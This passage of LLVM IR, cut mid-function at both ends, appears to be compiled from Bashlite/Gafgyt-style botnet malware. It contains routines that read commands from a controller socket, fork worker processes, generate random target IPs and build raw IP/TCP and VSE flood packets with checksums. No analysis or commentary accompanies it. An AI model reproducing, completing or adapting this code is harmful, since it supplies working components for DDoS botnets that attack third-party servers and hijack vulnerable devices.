  %49 = xor i1 %48, true
  br label %50

; <label>:50:                                     ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

; <label>:54:                                     ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #10
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #10
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

; <label>:64:                                     ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

; <label>:72:                                     ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

; <label>:76:                                     ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @RandString(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %88

; <label>:49:                                     ; preds = %33
  br label %50

; <label>:50:                                     ; preds = %83, %49
  %51 = load i32, i32* %13, align 4
  %52 = icmp slt i32 %51, 10
  br i1 %52, label %53, label %87

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* @mainCommSock, align 4
  %55 = call i32 (i32, i8*, ...) @sockprintf(i32 %54, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0))
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %57, align 8
  br label %58

; <label>:58:                                     ; preds = %53
  %59 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #2, !srcloc !3
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %14, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  br label %67

; <label>:67:                                     ; preds = %58
  %68 = load i32, i32* %5, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %73 = load i32, i32* %5, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %81, i32* %12, align 4
  %82 = icmp sle i32 %81, 0
  br i1 %82, label %83, label %86

; <label>:83:                                     ; preds = %67
  %84 = load i32, i32* %13, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %13, align 4
  br label %50

; <label>:86:                                     ; preds = %67
  br label %87

; <label>:87:                                     ; preds = %86, %50
  br label %88

; <label>:88:                                     ; preds = %87, %33
  store i32 0, i32* %18, align 4
  %89 = load i8*, i8** %6, align 8
  store i8* %89, i8** %17, align 8
  br label %90

; <label>:90:                                     ; preds = %108, %88
  %91 = load i32, i32* %7, align 4
  %92 = add nsw i32 %91, -1
  store i32 %92, i32* %7, align 4
  %93 = icmp sgt i32 %91, 1
  br i1 %93, label %94, label %111

; <label>:94:                                     ; preds = %90
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i64 @recv(i32 %95, i8* %16, i64 1, i32 0)
  %97 = icmp ne i64 %96, 1
  br i1 %97, label %98, label %100

; <label>:98:                                     ; preds = %94
  %99 = load i8*, i8** %17, align 8
  store i8 0, i8* %99, align 1
  store i32 -1, i32* %4, align 4
  br label %114

; <label>:100:                                    ; preds = %94
  %101 = load i8, i8* %16, align 1
  %102 = load i8*, i8** %17, align 8
  %103 = getelementptr inbounds i8, i8* %102, i32 1
  store i8* %103, i8** %17, align 8
  store i8 %101, i8* %102, align 1
  %104 = load i8, i8* %16, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 10
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %100
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i32, i32* %18, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %18, align 4
  br label %90

; <label>:111:                                    ; preds = %107, %90
  %112 = load i8*, i8** %17, align 8
  store i8 0, i8* %112, align 1
  %113 = load i32, i32* %18, align 4
  store i32 %113, i32* %4, align 4
  br label %114

; <label>:114:                                    ; preds = %111, %98
  %115 = load i32, i32* %4, align 4
  ret i32 %115
}

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #2
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #2
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

; <label>:33:                                     ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29

; <label>:39:                                     ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcp_udp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %36

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, %29
  store i32 %31, i32* %12, align 4
  %32 = load i16*, i16** %9, align 8
  %33 = getelementptr inbounds i16, i16* %32, i32 1
  store i16* %33, i16** %9, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sub nsw i32 %34, 2
  store i32 %35, i32* %8, align 4
  br label %23

; <label>:36:                                     ; preds = %23
  %37 = load i32, i32* %8, align 4
  %38 = icmp eq i32 %37, 1
  br i1 %38, label %39, label %46

; <label>:39:                                     ; preds = %36
  %40 = load i16*, i16** %9, align 8
  %41 = bitcast i16* %40 to i8*
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = load i32, i32* %12, align 4
  %45 = add i32 %44, %43
  store i32 %45, i32* %12, align 4
  br label %46

; <label>:46:                                     ; preds = %39, %36
  %47 = load i32, i32* %10, align 4
  %48 = lshr i32 %47, 16
  %49 = and i32 %48, 65535
  %50 = load i32, i32* %12, align 4
  %51 = add i32 %50, %49
  store i32 %51, i32* %12, align 4
  %52 = load i32, i32* %10, align 4
  %53 = and i32 %52, 65535
  %54 = load i32, i32* %12, align 4
  %55 = add i32 %54, %53
  store i32 %55, i32* %12, align 4
  %56 = load i32, i32* %11, align 4
  %57 = lshr i32 %56, 16
  %58 = and i32 %57, 65535
  %59 = load i32, i32* %12, align 4
  %60 = add i32 %59, %58
  store i32 %60, i32* %12, align 4
  %61 = load i32, i32* %11, align 4
  %62 = and i32 %61, 65535
  %63 = load i32, i32* %12, align 4
  %64 = add i32 %63, %62
  store i32 %64, i32* %12, align 4
  %65 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 6
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i16
  %69 = call zeroext i16 @htons(i16 zeroext %68) #13
  %70 = zext i16 %69 to i32
  %71 = load i32, i32* %12, align 4
  %72 = add i32 %71, %70
  store i32 %72, i32* %12, align 4
  %73 = load i16, i16* %7, align 2
  %74 = zext i16 %73 to i32
  %75 = load i32, i32* %12, align 4
  %76 = add i32 %75, %74
  store i32 %76, i32* %12, align 4
  br label %77

; <label>:77:                                     ; preds = %81, %46
  %78 = load i32, i32* %12, align 4
  %79 = lshr i32 %78, 16
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %87

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %12, align 4
  %83 = and i32 %82, 65535
  %84 = load i32, i32* %12, align 4
  %85 = lshr i32 %84, 16
  %86 = add i32 %83, %85
  store i32 %86, i32* %12, align 4
  br label %77

; <label>:87:                                     ; preds = %77
  %88 = load i32, i32* %12, align 4
  %89 = xor i32 %88, -1
  %90 = trunc i32 %89 to i16
  ret i16 %90
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @makeVSEPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  store i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i32 0, i32 0), i8** %11, align 8
  %13 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %14 = bitcast %struct.iphdr* %13 to i8*
  %15 = load i8, i8* %14, align 4
  %16 = and i8 %15, -16
  %17 = or i8 %16, 5
  store i8 %17, i8* %14, align 4
  %18 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %19 = bitcast %struct.iphdr* %18 to i8*
  %20 = load i8, i8* %19, align 4
  %21 = and i8 %20, 15
  %22 = or i8 %21, 64
  store i8 %22, i8* %19, align 4
  %23 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %24 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %23, i32 0, i32 1
  store i8 0, i8* %24, align 1
  %25 = load i32, i32* %10, align 4
  %26 = sext i32 %25 to i64
  %27 = add i64 20, %26
  %28 = load i32, i32* %12, align 4
  %29 = sext i32 %28 to i64
  %30 = add i64 %27, %29
  %31 = trunc i64 %30 to i16
  %32 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %33 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %32, i32 0, i32 2
  store i16 %31, i16* %33, align 2
  %34 = call i32 @rand_cmwc()
  %35 = trunc i32 %34 to i16
  %36 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %37 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %36, i32 0, i32 3
  store i16 %35, i16* %37, align 4
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 4
  store i16 0, i16* %39, align 2
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 5
  store i8 -1, i8* %41, align 4
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 6
  store i8 %42, i8* %44, align 1
  %45 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %46 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %45, i32 0, i32 7
  store i16 0, i16* %46, align 2
  %47 = load i32, i32* %8, align 4
  %48 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 8
  store i32 %47, i32* %49, align 4
  %50 = load i32, i32* %7, align 4
  %51 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 9
  store i32 %50, i32* %52, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
